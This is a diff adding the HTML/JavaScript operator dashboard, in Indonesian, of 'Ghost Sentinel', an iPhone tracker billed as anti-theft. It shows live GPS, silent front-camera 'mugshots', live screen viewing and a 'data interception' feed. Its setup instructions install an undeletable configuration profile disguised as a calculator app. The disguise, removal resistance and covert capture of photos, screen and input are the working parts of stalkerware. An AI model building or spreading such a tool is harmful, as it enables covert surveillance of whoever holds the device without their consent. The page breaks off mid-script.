@@ -1,0 +1,933 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ghost Sentinel — Anti-Maling Senyap & Pelacak Jarak Jauh</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script src="/qrcode.min.js"></script>
+  <style>
+    :root {
+      --bg: #030712;
+      --panel: rgba(15, 23, 42, 0.85);
+      --border: rgba(255, 255, 255, 0.1);
+      --primary: #38bdf8;
+      --accent: #10b981;
+      --danger: #ef4444;
+      --danger-glow: rgba(239, 68, 68, 0.4);
+      --text: #f8fafc;
+      --text-muted: #94a3b8;
+      --font: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font);
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    /* Top Bar */
+    header {
+      background: rgba(15, 23, 42, 0.95);
+      border-bottom: 1px solid var(--border);
+      padding: 10px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      z-index: 1000;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .radar-icon {
+      width: 36px;
+      height: 36px;
+      border-radius: 10px;
+      background: linear-gradient(135deg, #ef4444, #8b5cf6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      box-shadow: 0 0 16px var(--danger-glow);
+    }
+
+    .brand-title {
+      font-size: 17px;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+    }
+    .brand-title span { color: var(--danger); }
+
+    .header-actions {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .btn-header {
+      padding: 8px 14px;
+      border-radius: 8px;
+      font-size: 12px;
+      font-weight: 600;
+      cursor: pointer;
+      border: 1px solid var(--border);
+      background: rgba(255, 255, 255, 0.05);
+      color: var(--text);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s;
+    }
+
+    .btn-header:hover {
+      background: rgba(255, 255, 255, 0.1);
+    }
+
+    .btn-danger {
+      background: rgba(239, 68, 68, 0.2);
+      border-color: rgba(239, 68, 68, 0.5);
+      color: #fca5a5;
+    }
+
+    /* Layout Main */
+    .main-layout {
+      flex: 1;
+      display: flex;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Map Viewport */
+    #map {
+      flex: 1;
+      height: 100%;
+      background: #020617;
+      z-index: 1;
+    }
+
+    /* Sidebar Telemetry */
+    .sidebar {
+      width: 380px;
+      background: var(--panel);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border-left: 1px solid var(--border);
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      padding: 16px;
+      overflow-y: auto;
+      z-index: 500;
+    }
+
+    /* Alert Banner */
+    .alert-card {
+      background: rgba(16, 185, 129, 0.12);
+      border: 1px solid rgba(16, 185, 129, 0.35);
+      border-radius: 12px;
+      padding: 12px 14px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      transition: all 0.3s;
+    }
+
+    .alert-card.danger {
+      background: rgba(239, 68, 68, 0.2);
+      border-color: #ef4444;
+      animation: alertPulse 1.2s infinite alternate;
+    }
+
+    @keyframes alertPulse {
+      from { box-shadow: 0 0 10px rgba(239, 68, 68, 0.2); }
+      to { box-shadow: 0 0 25px rgba(239, 68, 68, 0.6); }
+    }
+
+    .alert-icon { font-size: 24px; flex-shrink: 0; }
+    .alert-title { font-size: 13px; font-weight: 700; color: #34d399; }
+    .alert-card.danger .alert-title { color: #f87171; }
+    .alert-desc { font-size: 11px; color: var(--text-muted); margin-top: 2px; }
+
+    /* Card Panels */
+    .card {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 14px;
+    }
+
+    .card-title {
+      font-size: 12px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: var(--text-muted);
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    /* Location Details */
+    .coord-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 8px;
+      margin-bottom: 10px;
+    }
+
+    .coord-item {
+      background: rgba(0, 0, 0, 0.3);
+      padding: 8px 10px;
+      border-radius: 8px;
+    }
+
+    .coord-lbl { font-size: 10px; color: var(--text-muted); text-transform: uppercase; }
+    .coord-val { font-size: 14px; font-family: monospace; font-weight: 700; color: var(--primary); }
+
+    .address-text {
+      font-size: 12px;
+      line-height: 1.4;
+      color: #e2e8f0;
+      margin-bottom: 12px;
+      min-height: 34px;
+    }
+
+    .btn-maps {
+      width: 100%;
+      padding: 10px;
+      background: linear-gradient(135deg, #0284c7, #0ea5e9);
+      border: none;
+      border-radius: 10px;
+      color: white;
+      font-weight: 700;
+      font-size: 13px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      text-decoration: none;
+    }
+
+    /* Device Metrics */
+    .metric-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 7px 0;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      font-size: 13px;
+    }
+    .metric-row:last-child { border-bottom: none; }
+    .metric-lbl { color: var(--text-muted); font-size: 12px; }
+    .metric-val { font-weight: 600; color: var(--text); }
+
+    /* Photo Mugshot Evidence */
+    .mugshot-container {
+      position: relative;
+      width: 100%;
+      height: 180px;
+      background: #000;
+      border-radius: 10px;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 1px solid rgba(239, 68, 68, 0.4);
+    }
+
+    .mugshot-img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .mugshot-empty {
+      color: var(--text-muted);
+      font-size: 12px;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .mugshot-badge {
+      position: absolute;
+      top: 8px;
+      right: 8px;
+      background: rgba(239, 68, 68, 0.85);
+      color: white;
+      font-size: 10px;
+      font-weight: 700;
+      padding: 3px 8px;
+      border-radius: 6px;
+      text-transform: uppercase;
+    }
+
+    /* Setup Modal */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(10px);
+      z-index: 10000;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .modal-card {
+      background: #0f172a;
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 24px;
+      max-width: 580px;
+      width: 100%;
+      max-height: 90vh;
+      overflow-y: auto;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
+    }
+
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 16px;
+    }
+    .modal-title { font-size: 17px; font-weight: 800; color: var(--primary); }
+
+    .step-box {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 14px;
+      margin-bottom: 12px;
+    }
+    .step-head { font-size: 13px; font-weight: 700; color: #34d399; margin-bottom: 6px; }
+    .step-body { font-size: 12px; color: var(--text-muted); line-height: 1.5; }
+
+    .url-input-box {
+      display: flex;
+      gap: 6px;
+      margin-top: 8px;
+    }
+    .url-input-box input {
+      flex: 1;
+      background: rgba(0, 0, 0, 0.5);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 6px 10px;
+      color: var(--primary);
+      font-family: monospace;
+      font-size: 12px;
+    }
+    .btn-copy-url {
+      padding: 6px 12px;
+      background: var(--primary);
+      border: none;
+      border-radius: 8px;
+      color: #030712;
+      font-weight: 700;
+      font-size: 11px;
+      cursor: pointer;
+    }
+
+    /* Radar Blinking Dot in Leaflet */
+    .radar-marker {
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background: #ef4444;
+      border: 3px solid white;
+      box-shadow: 0 0 15px #ef4444;
+      animation: radarPulse 1.5s infinite;
+    }
+
+    @keyframes radarPulse {
+      0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); }
+      70% { box-shadow: 0 0 0 25px rgba(239, 68, 68, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Bar -->
+  <header>
+    <div class="brand">
+      <div class="radar-icon">📡</div>
+      <div>
+        <div class="brand-title">GHOST <span>SENTINEL</span></div>
+        <div style="font-size: 10px; color: var(--text-muted); letter-spacing: 0.5px;">STEALTH ANTI-THEFT &amp; GLOBAL GPS TELEMETRY</div>
+      </div>
+    </div>
+
+    <div class="header-actions">
+      <div id="tunnelStatusBadge" style="font-size: 11px; padding: 6px 12px; border-radius: 8px; background: rgba(56, 189, 248, 0.1); border: 1px solid rgba(56, 189, 248, 0.3); color: #38bdf8; font-weight: 700; display: flex; align-items: center; gap: 6px;">
+        <span style="display:inline-block; width:8px; height:8px; border-radius:50%; background:#38bdf8; animation: pulse 1s infinite alternate;"></span>
+        <span>Menghubungkan Tunnel...</span>
+      </div>
+      <div style="font-size: 11px; padding: 6px 12px; border-radius: 8px; background: rgba(255,255,255,0.06); border: 1px solid var(--border); color: #f8fafc; font-weight: 700; display: flex; align-items: center; gap: 6px;">
+        <span style="color:#94a3b8;">PIN Hubung:</span> <strong id="topPinVal" style="color:#38bdf8; font-size: 13px; font-family: monospace;">7890</strong>
+      </div>
+      <button class="btn-header" style="background: rgba(16, 185, 129, 0.2); border-color: #10b981; color: #6ee7b7; font-weight: 700;" onclick="openSetupModal()">
+        📲 Pasang di iPhone (Anti-Hapus)
+      </button>
+      <button class="btn-header btn-danger" onclick="triggerAlarmSound()">
+        🔊 Tes Alarm Sirene
+      </button>
+      <button class="btn-header" onclick="location.href='/'">
+        📱 FiezelDrop
+      </button>
+    </div>
+  </header>
+
+  <!-- Main Viewport -->
+  <div class="main-layout">
+    <!-- Leaflet Map -->
+    <div id="map"></div>
+
+    <!-- Right Sidebar Telemetry -->
+    <div class="sidebar">
+      <!-- Alert Banner -->
+      <div class="alert-card" id="alertBanner">
+        <div class="alert-icon" id="alertIcon">🛡️</div>
+        <div>
+          <div class="alert-title" id="alertTitle">SISTEM SENYAP AKTIF</div>
+          <div class="alert-desc" id="alertDesc">Menunggu sinyal beacon terkini dari iPhone...</div>
+        </div>
+      </div>
+
+      <!-- Location Card -->
+      <div class="card">
+        <div class="card-title">
+          <span>📍 Koordinat GPS Terkini</span>
+          <span style="font-size: 10px; color: var(--primary);" id="gpsAccuracy">± 0 m</span>
+        </div>
+        <div class="coord-grid">
+          <div class="coord-item">
+            <div class="coord-lbl">Latitude</div>
+            <div class="coord-val" id="valLat">-0.000000</div>
+          </div>
+          <div class="coord-item">
+            <div class="coord-lbl">Longitude</div>
+            <div class="coord-val" id="valLon">0.000000</div>
+          </div>
+        </div>
+        <div class="address-text" id="valAddress">Memuat alamat lokasi terkini...</div>
+        <a href="#" target="_blank" class="btn-maps" id="btnGoogleMaps">
+          <span>🗺️</span> Buka Navigasi di Google Maps
+        </a>
+      </div>
+
+      <!-- Device Status Card -->
+      <div class="card">
+        <div class="card-title">
+          <span>📱 Status &amp; Aktivitas iPhone</span>
+          <span style="font-size: 10px; color: #34d399;" id="valLastSeen">Online</span>
+        </div>
+        <div class="metric-row">
+          <span class="metric-lbl">Status Baterai</span>
+          <span class="metric-val" id="valBattery">--%</span>
+        </div>
+        <div class="metric-row">
+          <span class="metric-lbl">Jaringan / Operator</span>
+          <span class="metric-val" id="valNetwork">--</span>
+        </div>
+        <div class="metric-row">
+          <span class="metric-lbl">Aktivitas Fisik</span>
+          <span class="metric-val" id="valActivity">Diam / Stationary</span>
+        </div>
+        <div class="metric-row">
+          <span class="metric-lbl">Kecepatan Gerak</span>
+          <span class="metric-val" id="valSpeed">0 km/h</span>
+        </div>
+        <div class="metric-row">
+          <span class="metric-lbl">Pemicu Laporan Terakhir</span>
+          <span class="metric-val" id="valTrigger">Manual Ping</span>
+        </div>
+      </div>
+
+      <!-- Mugshot Photo Card -->
+      <div class="card">
+        <div class="card-title">
+          <span>📸 Foto Wajah Bukti (Silent Mugshot)</span>
+        </div>
+        <div class="mugshot-container" id="mugshotBox">
+          <div class="mugshot-empty">Belum ada foto tangkapan darurat.<br>(Otomatis dijepret saat pencuri memicu jebakan)</div>
+        </div>
+      </div>
+
+      <!-- Live Screen Broadcast Card -->
+      <div class="card" style="border: 1px solid rgba(239, 68, 68, 0.35); background: rgba(15, 23, 42, 0.95);">
+        <div class="card-title" style="color: #f87171;">
+          <span>📺 Live Siaran Layar iPhone</span>
+          <span style="font-size: 10px; background: rgba(239, 68, 68, 0.2); color: #fca5a5; padding: 2px 8px; border-radius: 6px; font-weight: 800;" id="screenLiveBadge">SIAP</span>
+        </div>
+        <div style="position: relative; width: 100%; aspect-ratio: 9/16; max-height: 380px; background: #000; border-radius: 12px; overflow: hidden; display: flex; align-items: center; justify-content: center; border: 1px solid rgba(255,255,255,0.1); margin-top: 6px;">
+          <img id="liveScreenImg" src="" style="width: 100%; height: 100%; object-fit: contain; display: none;" alt="Live Screen Stream" />
+          <div id="screenEmptyPlaceholder" style="text-align: center; color: #64748b; font-size: 12px; padding: 20px; line-height: 1.6;">
+            <div style="font-size: 32px; margin-bottom: 8px;">📲</div>
+            Belum ada siaran layar aktif.<br>
+            <span style="font-size: 10px; color: #94a3b8;">Ketuk "Mulai Siaran Layar" di iPhone untuk menonton layarnya secara langsung.</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Live Intercept Feed / Riwayat Input & Aktivitas Pencuri -->
+      <div class="card">
+        <div class="card-title">
+          <span>⚡ Feed Intersepsi Data &amp; Aktivitas</span>
+          <span style="font-size: 10px; color: #34d399;" id="feedLiveBadge">LIVE</span>
+        </div>
+        <div id="liveActivityFeed" style="display: flex; flex-direction: column; gap: 8px; max-height: 220px; overflow-y: auto; padding-right: 4px;">
+          <div style="font-size: 11px; color: var(--text-muted); text-align: center; padding: 12px 0;">
+            Menunggu data baru atau perubahan dari iPhone...
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- SETUP MODAL FOR IPHONE -->
+  <div class="modal-overlay" id="setupModal">
+    <div class="modal-card">
+      <div class="modal-header">
+        <div class="modal-title">📲 Hubungkan iPhone Anda (1-Klik &amp; Anti-Hapus)</div>
+        <button onclick="closeSetupModal()" style="background: none; border: none; color: var(--text-muted); font-size: 20px; cursor: pointer;">✕</button>
+      </div>
+
+      <!-- METODE 1: PROFIL RESMI APPLE (.mobileconfig) — TIDAK BISA DIHAPUS PENCURI -->
+      <div class="step-box" style="border: 2px solid #10b981; background: rgba(16, 185, 129, 0.08);">
+        <div class="step-head" style="font-size: 15px; color: #34d399; display: flex; align-items: center; justify-content: space-between;">
+          <span style="display: flex; align-items: center; gap: 8px;">👑 METODE 1: File Profil Apple (.mobileconfig) — 1-Klik Langsung Terpasang</span>
+          <span style="font-size: 10px; background: #10b981; color: #000; padding: 2px 8px; border-radius: 6px; font-weight: 800;">DIREKOMENDASIKAN</span>
+        </div>
+        <div class="step-body" style="margin-top: 8px; line-height: 1.5;">
+          Cukup unduh <strong>1 file profil Apple</strong> di bawah. Sekali pasang, iPhone langsung terprogram otomatis tanpa perlu atur Pintasan (Shortcuts) yang membingungkan:
+        </div>
+
+        <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; margin: 16px 0; gap: 10px;">
+          <div id="trackQrCode" style="background: white; padding: 12px; border-radius: 12px; display: inline-block;"></div>
+          <div style="font-size: 11px; color: var(--primary); font-family: monospace; word-break: break-all; text-align: center;" id="trackUrlText">
+            Memuat tautan profil...
+          </div>
+          <a id="btnDownloadProfile" href="/sentinel.mobileconfig" download="Kalkulator.mobileconfig" style="display: inline-flex; align-items: center; gap: 8px; background: #10b981; color: #022c22; font-weight: 800; font-size: 13px; padding: 10px 20px; border-radius: 10px; text-decoration: none; margin-top: 4px;">
+            📥 Unduh File Profil (.mobileconfig)
+          </a>
+        </div>
+
+        <div style="background: rgba(0,0,0,0.4); border-radius: 10px; padding: 12px; font-size: 12px; line-height: 1.6; border: 1px solid rgba(255,255,255,0.08);">
+          <strong style="color: #6ee7b7;">Langkah Pasang di iPhone (Sangat Mudah):</strong><br>
+          <strong>1.</strong> Buka <strong>Kamera iPhone</strong> &rarr; Arahkan ke QR Code di atas &rarr; Ketuk tautan &rarr; Ketuk <strong>"Izinkan" (Allow)</strong> saat muncul notifikasi Profil Diunduh.<br>
+          <strong>2.</strong> Buka <strong>Pengaturan (Settings)</strong> iPhone &rarr; Ketuk menu <strong>"Profil Diunduh"</strong> di paling atas &rarr; Ketuk <strong>"Pasang" (Install)</strong>.<br>
+          <div style="margin-top: 8px; padding-top: 8px; border-top: 1px dashed rgba(255,255,255,0.12); color: #cbd5e1;">
+            ✨ <strong>Proteksi Anti-Maling Spesial:</strong><br>
+            • 🔒 <strong>TIDAK BISA DIHAPUS PENCURI</strong>: Ikon "Kalkulator" diproteksi konfigurasi sistem Apple. Tombol silang/hapus ditiadakan dari layar utama!<br>
+            • 🎭 <strong>KAMUFLASE 100% PERSIS KALKULATOR</strong>: Tidak ada tulisan link/URL mencurigakan dan tanpa browser bar Safari.<br>
+            • 📸 <strong>KAMERA DEPAN SENYAP</strong>: Setiap tombol kalkulator ditekan pencuri, kamera depan seketika menjepret wajahnya diam-diam lalu koordinat GPS + foto langsung terkirim ke laptop!
+          </div>
+        </div>
+      </div>
+
+      <!-- METODE 2: KODE HUBUNG / PIN CEPAT -->
+      <div class="step-box" style="border: 1px solid rgba(56, 189, 248, 0.4); background: rgba(56, 189, 248, 0.05); margin-top: 14px;">
+        <div class="step-head" style="color: #38bdf8; font-size: 14px; display: flex; align-items: center; justify-content: space-between;">
+          <span>🔑 METODE 2: Hubungkan Cepat Menggunakan Kode PIN</span>
+        </div>
+        <div class="step-body" style="margin-top: 8px;">
+          Buka tautan langsung di Safari iPhone atau gunakan PIN rahasia Anda:
+          
+          <div style="display: flex; align-items: center; gap: 12px; margin: 12px 0;">
+            <div>
+              <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Kode PIN Perangkat:</label>
+              <div style="display: flex; gap: 6px;">
+                <input type="text" id="inputPinField" value="7890" maxlength="8" style="background: rgba(0,0,0,0.5); border: 1px solid var(--border); border-radius: 8px; padding: 6px 10px; color: #38bdf8; font-family: monospace; font-size: 15px; font-weight: 800; width: 80px; text-align: center;">
+                <button onclick="savePinChange()" style="padding: 6px 12px; background: #0284c7; border: none; border-radius: 8px; color: #fff; font-weight: 700; font-size: 11px; cursor: pointer;">Simpan</button>
+              </div>
+            </div>
+            <div style="flex: 1; font-size: 11px; color: #94a3b8; line-height: 1.5;">
+              💡 <strong>Membuka Menu Pemilik di iPhone:</strong><br>
+              Di layar kalkulator iPhone, ketik PIN lalu tekan tombol <strong>=</strong> (contoh: <code style="color:#38bdf8; font-weight:bold;">7890=</code>) untuk membuka menu pemilik.
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <button onclick="closeSetupModal()" style="width: 100%; padding: 14px; background: var(--primary); border: none; border-radius: 12px; font-weight: 800; cursor: pointer; color: #000; margin-top: 14px; font-size: 14px;">
+        Selesai &amp; Tutup
+      </button>
+    </div>
+  </div>
+
+  <script>
+    // Inisialisasi Peta Leaflet
+    let map = L.map('map', {
+      zoomControl: false
+    }).setView([-6.2088, 106.8456], 13); // Default Jakarta
+
+    L.control.zoom({ position: 'topright' }).addTo(map);
+
+    // Layer Satelit & Street
+    const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      maxZoom: 19,
+      attribution: '© OpenStreetMap'
+    });
+
+    const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+      maxZoom: 19,
+      attribution: '© Esri Satellite'
+    });
+
+    satelliteLayer.addTo(map); // Default satelit
+
+    L.control.layers({
+      "🛰️ Tampilan Satelit": satelliteLayer,
+      "🗺️ Peta Jalan (Street)": streetLayer
+    }, null, { position: 'topright' }).addTo(map);
+
+    // Marker & Radar Circle
+    let radarMarker = null;
+    let accuracyCircle = null;
+    let routePolyline = null;
+    let breadcrumbCoords = [];
+
+    function updateMapPosition(lat, lon, accuracy) {
+      const latlng = [lat, lon];
+      breadcrumbCoords.push(latlng);
+
+      if (!radarMarker) {
+        const radarIcon = L.divIcon({
+          className: 'radar-marker',
+          iconSize: [22, 22],
+          iconAnchor: [11, 11]
+        });
+        radarMarker = L.marker(latlng, { icon: radarIcon }).addTo(map);
+      } else {
+        radarMarker.setLatLng(latlng);
+      }
+
+      if (!accuracyCircle) {
+        accuracyCircle = L.circle(latlng, {
+          radius: accuracy || 15,
+          color: '#ef4444',
+          fillColor: '#ef4444',
+          fillOpacity: 0.15,
+          weight: 1
+        }).addTo(map);
+      } else {
+        accuracyCircle.setLatLng(latlng);
+        accuracyCircle.setRadius(accuracy || 15);
+      }
+
+      // Draw breadcrumb path
+      if (breadcrumbCoords.length > 1) {
+        if (!routePolyline) {
+          routePolyline = L.polyline(breadcrumbCoords, {
+            color: '#38bdf8',
+            weight: 3,
+            dashArray: '6, 8',
+            opacity: 0.8
+          }).addTo(map);
+        } else {
+          routePolyline.setLatLngs(breadcrumbCoords);
+        }
+      }
+
+      map.setView(latlng, 16);
+    }
+
+    // Modal Handlers
+    function openSetupModal() { document.getElementById('setupModal').style.display = 'flex'; }
+    function closeSetupModal() { document.getElementById('setupModal').style.display = 'none'; }
+    function copyBeaconUrl() {
+      const input = document.getElementById('beaconUrlInput');
+      if (input) {
+        navigator.clipboard.writeText(input.value);
+        alert('URL Beacon disalin ke clipboard!');
+      }
+    }
+
+    function copyBeaconGetUrl() {
+      const input = document.getElementById('beaconGetUrlInput');
+      if (input) {
+        navigator.clipboard.writeText(input.value);
+        alert('Link Jebakan disalin! Cukup tempel di tindakan Buka URL di iPhone.');
+      }
+    }
+
+    let currentQrUrl = null;
+    function renderQr(url) {
+      if (!url || url === currentQrUrl) return;
+      currentQrUrl = url;
+      const qrEl = document.getElementById('trackQrCode');
+      const txtEl = document.getElementById('trackUrlText');
+      if (txtEl) txtEl.textContent = url;
+      if (qrEl && typeof QRCode !== 'undefined') {
+        qrEl.innerHTML = '';
+        new QRCode(qrEl, {
+          text: url,
+          width: 160,
+          height: 160,
+          colorDark: '#000000',
+          colorLight: '#ffffff',
+          correctLevel: QRCode.CorrectLevel.M
+        });
+      }
+    }
+
+    // Alarm Siren Sound
+    let audioCtx = null;
+    function triggerAlarmSound() {
+      try {
+        if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        let osc = audioCtx.createOscillator();
+        let gain = audioCtx.createGain();
+        osc.type = 'sawtooth';
+        osc.frequency.setValueAtTime(800, audioCtx.currentTime);
+        osc.frequency.linearRampToValueAtTime(1400, audioCtx.currentTime + 0.3);
+        osc.frequency.linearRampToValueAtTime(800, audioCtx.currentTime + 0.6);
+        gain.gain.setValueAtTime(0.3, audioCtx.currentTime);
+        gain.gain.linearRampToValueAtTime(0.01, audioCtx.currentTime + 0.8);
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        osc.start();
+        osc.stop(audioCtx.currentTime + 0.8);
+      } catch(e) {}
+    }
+
+    // Trigger Simulasi Jebakan
+    async function triggerTestBeacon() {
+      try {
+        const res = await fetch('/api/sentinel/test', { method: 'POST' });
+        const data = await res.json();
+        if (data.ok) {
+          fetchStatus();
+        }
+      } catch (err) {
+        alert('Gagal trigger simulasi: ' + err.message);
+      }
+    }
+
+    // Polling / SSE Telemetry Data
+    async function fetchStatus() {
+      try {
+        const res = await fetch('/api/sentinel/status');
+        const data = await res.json();
+        if (data.ok) {
+          const profileLink = data.profileUrl || data.trackUrl;
+          if (profileLink) {
+            renderQr(profileLink);
+            const btnProf = document.getElementById('btnDownloadProfile');
+            if (btnProf && data.profileUrl) btnProf.href = data.profileUrl;
+          }
+          if (data.pairingPin) {
+            const topPin = document.getElementById('topPinVal');
+            if (topPin) topPin.textContent = data.pairingPin;
+            const inputPin = document.getElementById('inputPinField');
+            if (inputPin && document.activeElement !== inputPin) {
+              inputPin.value = data.pairingPin;
+            }
+          }
+          if (data.beaconUrl) {
+            const input = document.getElementById('beaconUrlInput');
+            if (input) input.value = data.beaconUrl;
+            const inputGet = document.getElementById('beaconGetUrlInput');
+            if (inputGet) inputGet.value = `${data.beaconUrl}?alert=airplane_mode_trap`;
+          }
+          const tunnelBadge = document.getElementById('tunnelStatusBadge');
+          if (tunnelBadge) {
+            if (data.cloudUrl) {
+              tunnelBadge.innerHTML = `<span style="display:inline-block; width:8px; height:8px; border-radius:50%; background:#10b981;"></span><span>🌐 5.000 KM Cloudflare: <strong style="color:white">ONLINE</strong></span>`;
+              tunnelBadge.style.color = '#38bdf8';
+              tunnelBadge.style.borderColor = '#38bdf8';
+            } else {
+              tunnelBadge.innerHTML = `<span style="display:inline-block; width:8px; height:8px; border-radius:50%; background:#10b981;"></span><span>📡 Wi-Fi Lokal (${data.localIp || 'OK'})</span>`;
+              tunnelBadge.style.color = '#a7f3d0';
+              tunnelBadge.style.borderColor = 'rgba(16, 185, 129, 0.3)';
+            }
+          }
+          if (data.current) {
+            renderTelemetry(data.current, data.alerts);
+          }
+          if (data.intercepts) {
+            renderIntercepts(data.intercepts);
+          }
+        }
+      } catch (err) {}
+    }
+
+    async function savePinChange() {
+      const pinInput = document.getElementById('inputPinField');
+      if (!pinInput) return;
+      const pin = pinInput.value.trim();
+      if (!pin) return;
+      try {
+        const res = await fetch('/api/sentinel/pin', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ pin })
+        });
+        const data = await res.json();
+        if (data.ok) {
+          alert('✅ PIN Perangkat berhasil diperbarui ke: ' + data.pin);
+          const topPin = document.getElementById('topPinVal');
+          if (topPin) topPin.textContent = data.pin;
+        } else {
+          alert('Gagal simpan PIN: ' + (data.error || 'Unknown error'));
+        }
+      } catch (err) {
+        alert('Gagal simpan PIN: ' + err.message);
+      }
+    }
+
+    function renderTelemetry(telemetry, alerts) {
+      if (!telemetry) return;
+      document.getElementById('valLat').textContent = Number(telemetry.lat).toFixed(6);
+      document.getElementById('valLon').textContent = Number(telemetry.lon).toFixed(6);
+      document.getElementById('gpsAccuracy').textContent = `± ${telemetry.accuracy || 5} m`;
+      document.getElementById('valBattery').textContent = `${telemetry.batteryLevel || '--'}% ${telemetry.isCharging ? '(⚡ Dicas)' : ''}`;
+      document.getElementById('valNetwork').textContent = telemetry.networkName || 'Seluler';
+      document.getElementById('valActivity').textContent = telemetry.activity || 'Stationary (Diam)';
+      document.getElementById('valSpeed').textContent = `${telemetry.speed ? Math.round(telemetry.speed * 3.6) : 0} km/h`;
+      document.getElementById('valTrigger').textContent = telemetry.alertType || 'Normal Beacon';
+
+      const mapsLink = `https://www.google.com/maps?q=${telemetry.lat},${telemetry.lon}`;
+      document.getElementById('btnGoogleMaps').href = mapsLink;
+
+      // Update Map
+      updateMapPosition(telemetry.lat, telemetry.lon, telemetry.accuracy);
+
+      // Alert state
+      const alertCard = document.getElementById('alertBanner');
+      if (telemetry.alertType && (telemetry.alertType.includes('airplane') || telemetry.alertType.includes('trap'))) {
+        alertCard.className = 'alert-card danger';
+        document.getElementById('alertIcon').textContent = '🚨';
+        document.getElementById('alertTitle').textContent = 'WASPADA: PENCURIAN TERDETEKSI!';
+        document.getElementById('alertDesc').textContent = 'Pencuri mencoba mengaktifkan Mode Pesawat! Lokasi seketika diamankan.';
+        triggerAlarmSound();
+      } else if (telemetry.alertType && telemetry.alertType.includes('battery')) {
+        alertCard.className = 'alert-card danger';
+        document.getElementById('alertIcon').textContent = '⚠️';
+        document.getElementById('alertTitle').textContent = 'BATERAI KRITIS: POSISI TERAKHIR';
+        document.getElementById('alertDesc').textContent = 'Laporan darurat sebelum iPhone kehabisan daya.';
+      } else {
+        alertCard.className = 'alert-card';
+        document.getElementById('alertIcon').textContent = '🛡️';
+        document.getElementById('alertTitle').textContent = 'SISTEM SENYAP AKTIF';
+        document.getElementById('alertDesc').textContent = `Beacon diterima: ${new Date(telemetry.timestamp).toLocaleTimeString()}`;
+      }
+
+      // Reverse geocoding alamat jika belum ada
+      if (telemetry.address) {
+        document.getElementById('valAddress').textContent = telemetry.address;
+      } else {
+        reverseGeocode(telemetry.lat, telemetry.lon);
+      }
+
+      // Mugshot image
+      if (telemetry.photo) {
+        const mugshotBox = document.getElementById('mugshotBox');
+        mugshotBox.innerHTML = `
+          <div class="mugshot-badge">🚨 FOTO BUKTI</div>
+          <img src="${telemetry.photo}" class="mugshot-img" alt="Wajah Pencuri" />
+        `;
+      }
+    }
+
+    async function reverseGeocode(lat, lon) {
+      try {
+        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+        const json = await res.json();
+        if (json.display_name) {
+          document.getElementById('valAddress').textContent = json.display_name;
+        }
+      } catch(e) {}
+    }
+
+    function playChimeSound() {
+      try {
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(587.33, ctx.currentTime); // D5
+        osc.frequency.setValueAtTime(880.00, ctx.currentTime + 0.1); // A5
